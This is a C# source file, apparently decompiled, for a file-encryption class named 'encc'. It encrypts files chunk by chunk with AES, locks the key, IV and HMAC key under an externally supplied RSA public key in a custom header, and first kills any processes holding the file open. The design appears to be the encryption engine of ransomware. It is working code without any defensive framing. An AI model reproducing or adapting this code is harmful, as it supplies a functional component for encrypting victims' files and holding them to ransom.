using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace SAM;

internal class encc
{
	public static string sn = Environment.NewLine;

	public static int chunkSize = 10240;

	public static int headerSize = 3072;

	public static string Encrypt(string plainFilePath, string encryptedFilePath, string manifestFilePath, string rsaKey)
	{
		byte[] signatureKey = GenerateRandom(64);
		byte[] key = GenerateRandom(16);
		byte[] iv = GenerateRandom(16);
		EncryptFile(plainFilePath, encryptedFilePath, key, iv, signatureKey, rsaKey);
		return null;
	}

	private static bool checkOSCompatibility()
	{
		bool result = true;
		OperatingSystem oSVersion = Environment.OSVersion;
		if (oSVersion.Version.Major == 5)
		{
			result = false;
		}
		return result;
	}

	private static void EncryptFile(string plainFilePath, string encryptedFilePath, byte[] key, byte[] iv, byte[] signatureKey, string rsaKey)
	{
		if (checkOSCompatibility())
		{
			killOpenedProcessTree(plainFilePath);
		}
		if (File.Exists(encryptedFilePath))
		{
			File.Delete(encryptedFilePath);
		}
		byte[] byteArray = new byte[headerSize];
		WriteBytesToFile(encryptedFilePath, byteArray);
		bool flag = true;
		FileInfo fileInfo = new FileInfo(plainFilePath);
		for (long num = 0L; num < fileInfo.Length / chunkSize + 1L; num++)
		{
			int readCount;
			byte[] bytesFromFile = GetBytesFromFile(plainFilePath, num * chunkSize, out readCount);
			byte[] array = new byte[readCount];
			Buffer.BlockCopy(bytesFromFile, 0, array, 0, readCount);
			if (readCount > 0)
			{
				byte[] byteArray2 = EncryptStringToBytes(array, key, iv);
				if (!(flag = WriteBytesToFile(encryptedFilePath, byteArray2)))
				{
					break;
				}
			}
		}
		if (!flag)
		{
			return;
		}
		try
		{
			byte[] inArray = CalculateSignature(encryptedFilePath, signatureKey);
			string text = Convert.ToBase64String(RSAEncryptBytes(key, rsaKey));
			string text2 = Convert.ToBase64String(RSAEncryptBytes(iv, rsaKey));
			string text3 = Convert.ToBase64String(inArray);
			string text4 = Convert.ToBase64String(RSAEncryptBytes(signatureKey, rsaKey));
			string str = "<MtAeSKeYForFile>" + sn + "<Key>" + text + "</Key>" + sn + "<IV>" + text2 + "</IV>" + sn + "<Value>" + text3 + "</Value>" + sn + "<EncryptedKey>" + text4 + "</EncryptedKey>" + sn + "<OriginalFileLength>" + fileInfo.Length + "</OriginalFileLength>" + sn + "</MtAeSKeYForFile>";
			byte[] bytesFromString = GetBytesFromString(str);
			WriteHeaderBytesToFile(encryptedFilePath, bytesFromString);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Key is not correct format : " + ex.Message);
			if (File.Exists(encryptedFilePath))
			{
				File.Delete(encryptedFilePath);
			}
		}
	}

	public static byte[] GetBytesFromFile(string fullFilePath, long from, out int readCount)
	{
		using FileStream fileStream = new FileStream(fullFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		byte[] array = new byte[chunkSize];
		fileStream.Seek(from, SeekOrigin.Begin);
		readCount = fileStream.Read(array, 0, array.Length);
		return array;
	}

	public static void killOpenedProcessTree(string fileName)
	{
		List<Process> list = FileUtil.WhoIsLocking(fileName);
		foreach (Process item in list)
		{
			KillProcessWithWait(item, waitForExit: true);
		}
	}

	public static bool KillProcessWithWait(Process p, bool waitForExit = false)
	{
		if (p != null && !p.HasExited)
		{
			p.Kill();
			if (waitForExit)
			{
				p.WaitForExit();
			}
			return true;
		}
		return false;
	}

	public static bool WriteBytesToFile(string _FileName, byte[] _ByteArray)
	{
		FileStream fileStream = new FileStream(_FileName, FileMode.Append, FileAccess.Write);
		try
		{
			fileStream.Write(_ByteArray, 0, _ByteArray.Length);
			fileStream.Close();
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception caught in process: {0}", ex.ToString());
			fileStream.Close();
			if (File.Exists(_FileName))
			{
				File.Delete(_FileName);
			}
		}
		return false;
	}

	public static bool WriteHeaderBytesToFile(string _FileName, byte[] _ByteArray)
	{
		FileStream fileStream = new FileStream(_FileName, FileMode.OpenOrCreate, FileAccess.Write);
		try
		{
			fileStream.Write(_ByteArray, 0, _ByteArray.Length);
			fileStream.Close();
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception caught in process: {0}", ex.ToString());
			fileStream.Close();
			if (File.Exists(_FileName))
			{
				File.Delete(_FileName);
			}
		}
		return false;
	}

	private static byte[] EncryptStringToBytes(byte[] plainBuf, byte[] Key, byte[] IV)
	{
		if (plainBuf != null && plainBuf.Length > 0)
		{
			if (Key != null && Key.Length > 0)
			{
				if (IV != null && IV.Length > 0)
				{
					using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
					{
						rijndaelManaged.KeySize = 128;
						rijndaelManaged.FeedbackSize = 8;
						rijndaelManaged.Key = Key;
						rijndaelManaged.IV = IV;
						rijndaelManaged.Padding = PaddingMode.Zeros;
						ICryptoTransform transform = rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV);
						using MemoryStream memoryStream = new MemoryStream();
						byte[] result;
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
						{
							cryptoStream.Write(plainBuf, 0, plainBuf.Length);
							cryptoStream.FlushFinalBlock();
							result = memoryStream.ToArray();
							cryptoStream.Close();
						}
						memoryStream.Close();
						return result;
					}
				}
				throw new ArgumentNullException("IV");
			}
			throw new ArgumentNullException("Key");
		}
		throw new ArgumentNullException("plainText");
	}

	private static byte[] CalculateSignature(string filePath, byte[] key)
	{
		byte[] array = null;
		using HMACSHA256 hMACSHA = new HMACSHA256(key);
		using FileStream inputStream = File.Open(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
		return hMACSHA.ComputeHash(inputStream);
	}

	private static byte[] GenerateRandom(int length)
	{
		byte[] array = new byte[length];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static byte[] RSAEncryptBytes(byte[] datas, string keyXml)
	{
		byte[] array = null;
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.FromXmlString(keyXml);
		return rSACryptoServiceProvider.Encrypt(datas, fOAEP: true);
	}

	public static byte[] GetBytesFromString(string str)
	{
		byte[] array = new byte[str.Length * 2];
		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}
}
